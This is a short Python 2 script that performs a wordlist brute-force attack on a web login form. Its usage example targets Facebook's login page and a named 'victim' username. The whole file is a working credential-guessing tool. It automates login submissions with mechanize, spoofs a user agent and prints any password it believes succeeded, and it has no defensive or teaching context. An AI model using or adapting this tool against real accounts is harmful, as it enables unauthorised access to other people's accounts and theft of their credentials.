import mechanize
import cookielib
import cookielib
import sys
import argparse
import time

example = ''' python .py -u https://www.facebook.com/login -uI email -us username -pI pass -w wordlist.txt -t https://www.facebook.com/?ref=tn_tnmn '''

arparser = argparse.ArgumentParser(description='wordlist attack')


arparser.add_argument(
    "-u", "--url", required=False, help="URL to attack"
)

arparser.add_argument(
    "-uI", "--usernameId", required=False, help="the html username id"
)

arparser.add_argument(
    "-us", "--username", required=False, help="username of the victim"
)

arparser.add_argument(
    "-pI", "--passwordId", required=False, help="the html password id"
)

arparser.add_argument(
    "-w", "--wordlistfile", required=False, help="the word list file location"
)


arparser.add_argument(
    "-t", "--urltitle", required=False, help="the title of the url after attack"
)

parser = vars(arparser.parse_args())


login = parser["url"]
user_html_input = parser["usernameId"]
user = parser["username"]
html_pass_input = parser["passwordId"]
password = parser["wordlistfile"]
after_request_url = parser["urltitle"]



password = open(password, 'r') 
password = password.readlines()
print 'numbers of passwords to try : %s ' % len(password) # create an empty list to store the lines in the file

 # print out the 1st and last word of each line

br = mechanize.Browser()

# Browser Configurations
cj=cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) 

# User Agent
k=('Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0')

print "attacking the user : {}" .format(user)

# Add User Agent In Header
br.addheaders = [('User-agent', k)]

print "attack started ..."

# Try To Get Login Page
site = br.open(login)
start_time = time.time()

for pwd in password :
    sys.stdout.write("trying : %s" % pwd )
    sys.stdout.flush()
    try:
# Select Form By Index
       br.select_form(nr=0)

# Enter Username
       br.form[user_html_input] = user

# Enter Password
       br.form[html_pass_input] = pwd

# Now Submit
       br.submit()

# Get Url
       log=br.geturl()

# Check Login Page Url
    
       #sys.stdout.write("trying : %s" % pwd)    
    except Exception :
           
           print "[+] Your password is :{} ".format(pwd)
           print 'Time elapsed: ' + str(time.time() - start_time)
           sys.exit()
